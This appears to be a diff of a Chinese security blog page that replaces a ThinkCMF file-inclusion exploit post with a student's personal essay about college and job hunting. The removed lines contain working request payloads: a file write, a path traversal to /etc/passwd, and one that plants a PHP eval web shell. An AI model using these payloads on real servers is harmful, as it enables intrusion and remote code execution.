@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
     <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    <title>ThinkCMF框架任意文件包含 | GMF信息小站</title>
+    <title>随笔杂谈1 | GMF信息小站</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
     <meta name="keywords" content="givemefivw, POC&EXP, Web安全, 渗透测试, 编程语言" >
     <meta name="description" content="信息安全小站" >
@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1614948451266.css">
+<link rel="stylesheet" href="/css/style.css?v=1614948451228.css">
 
     <!--[if lt IE 9]>
     
@@ -50,11 +50,11 @@
         <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
         <ul class="menu hidden" id="JELON__menu">
             
-            <li rel="/2021/01/14/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html" class="item ">
+            <li rel="/2021/03/05/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%881/index.html" class="item ">
                 <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
             </li>
             
-            <li rel="/2021/01/14/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html" class="item ">
+            <li rel="/2021/03/05/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%881/index.html" class="item ">
                 <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
             </li>
             
@@ -105,41 +105,49 @@
 <!-- 文章 -->
 <article class="post article">
     <header class="text-center">
-        <h3 class="post-title"><span>ThinkCMF框架任意文件包含</span></h3>
+        <h3 class="post-title"><span>随笔杂谈1</span></h3>
     </header>
     <p class="post-meta text-center">
-        SOC 将离 发表于
-        <time datetime="2021-01-14T09:56:03.000Z">2021-01-14</time>
+        givemefivw 发表于
+        <time datetime="2021-03-05T12:43:00.000Z">2021-03-05</time>
     </p>
     <div id="JELON__articlePostContent" class="post-content">
-        <h1 id="ThinkCMF框架任意文件包含"><a href="#ThinkCMF框架任意文件包含" class="headerlink" title="ThinkCMF框架任意文件包含"></a>ThinkCMF框架任意文件包含</h1><p>Ver：</p>
-<ul>
-<li>ThinkCMF X1.6.0  </li>
-<li>ThinkCMF X2.1.0  </li>
-<li>ThinkCMF X2.2.0  </li>
-<li>ThinkCMF X2.2.1  </li>
-<li>ThinkCMF X2.2.2  </li>
-<li>ThinkCMF X2.2.3  </li>
-</ul>
-<h2 id="Exp："><a href="#Exp：" class="headerlink" title="Exp："></a>Exp：</h2><p>第一种：<br>通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件phpinfo版payload如下：  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;fetch&amp;templateFile&#x3D;public&#x2F;index&amp;prefix&#x3D;&#39;&#39;&amp;content&#x3D;&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo(); ?&gt;&#39;)&lt;&#x2F;php&gt;</span><br></pre></td></tr></table></figure>
-<p>第二种：<br>通过构造a参数的display方法，实现任意文件包含漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;display&amp;templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>写入一句话</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;fetch&amp;templateFile&#x3D;public&#x2F;index&amp;prefix&#x3D;&#39;&#39;&amp;content&#x3D;&lt;php&gt;file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php @eval($_REQUEST[pwd]) ?&gt;&#39;)&lt;&#x2F;php&gt;</span><br></pre></td></tr></table></figure>
-<p>Shell地址：<a target="_blank" rel="noopener" href="http://host/shell.php">http://host/shell.php</a><br>蚁剑连接，进行GetShell</p>
+        <p>  作为一个马上毕业的大四生，回想起我这四年大学生活，有点小感慨。Hexo没有加入评论的插件，所以也不用担心会被喷，遂写点小东西。</p>
+<p>  从我当初报考的时候开始写吧。</p>
+<p>  说来好笑，当时填志愿都不是我自己填的，甚至填的是什么我都不知道。因为我家那台电脑太老了，记得当时那个网页需要IE11，在乡下也找不到网吧，后来实在没办法联系了我一个亲戚，在招生办工作，麻烦亲戚帮我填的。而作为当事人，我唯一知道的就是报了电子信息这个专业。</p>
+<p>  没错，因为好就业。</p>
+<p>  其实我一直都不是很懂，小初高上了九年，每天都有人告诉我该怎么学习，却好像没人告诉我该怎么去选专业，只有高考毕业后那本厚厚的，三十几块从学校买的报考指南。</p>
+<p>  初二迷上了看动漫，看的第一个叫做《落地骑士英雄谭》。</p>
+<p>  报考的时候想过动画这个专业，因为对这个感兴趣，但被家长一票否决，理由就是不好就业。</p>
+<p>  那时候我就在想，我上大学，到底是为了兴趣选择还是为了就业选择。</p>
+<p>  后来上大学之后我特意去了解了一下动画专业，结果我只能说人生没有回头路。选择了一条路就要走到底。无论选择对错与否。</p>
+<p>  再来说说大学。</p>
+<p>  很平常。</p>
+<p>  人生第一次逃课就被抓了。直接到导员那去受训了。</p>
+<p>  也有谈过恋爱。两次。</p>
+<p>  第二次分手之后，自己一个人喝了酒，想了很多。那之后到现在再也没谈过。说来好笑，那天喝酒之后梦见的却是高中的她。</p>
+<p>  大三就碰上了疫情了，在家里蹲了半年。对疫情是又恨又感激。</p>
+<p>  恨得是哪也去不了，感激的是哪也去不了。</p>
+<p>  线上考试让我把挂掉的课程清零了，哪也去不了让我能稍微沉下来学东西。</p>
+<p>  后来想投简历试试，就去写了简历，在Boss直聘上投，前后面了三家，拿到了offer。</p>
+<p>  前几天有学弟学妹问我该怎么找工作。</p>
+<p>  我的观点是想明白自己到底要做什么。</p>
+<p>  就业不像当初的报考，不喜欢报考的专业可以转专业，付出的可能是金钱，但是不喜欢自己的工作，付出的不仅仅是金钱，还有时间。</p>
+<p>  总之且比较自恋的说吧，这大学四年反正也不算白过，至少没有到毕业即失业那个地步。</p>
+<p>  生活嘛，过的开心就行了。</p>
+<p>  是吧。</p>
 
     </div>
     <p class="eof">-- EOF --</p>
     <p class="post-meta">
         <span class="post-cat">分类：
-            <a class="cat-link" href="/categories/POC-EXP/">POC&EXP</a>
+            <a class="cat-link" href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
         </span>
         <span class="post-tags">
             标签：
             
     
-        <a href="/tags/POC/" title="POC">POC</a>
+        <a href="/tags/%E9%9A%8F%E7%AC%94/" title="随笔">随笔</a>
     
 
         </span>
@@ -165,20 +173,16 @@
     
     <span class="prev fl">
         上一篇<br >
-        <a href="/2021/01/14/CVE-2020-10148-Solar-Winds-OrionAPI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
-            
-                CVE-2020-10148_Solar_Winds_OrionAPI_远程代码执行漏洞
-            
-        </a>
+        <a href="javascript: void(0);">没有上一篇了</a>
     </span>
     
 
     
     <span class="next fr">
         下一篇<br >
-        <a href="/2021/01/14/%E8%87%B4%E8%BF%9COA-ajaxAction-formulaManager-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+        <a href="/2021/02/17/Samsung-WLAN-AP-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-RCE/">
             
-                致远OA ajaxAction formulaManager 文件上传漏洞
+                Samsung WLAN AP 任意文件读取&amp;RCE
             
         </a>
     </span>
@@ -304,7 +308,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1614948451267.js"></script>
+<script src="/js/main.js?v=1614948451230.js"></script>
 
 
 </body>
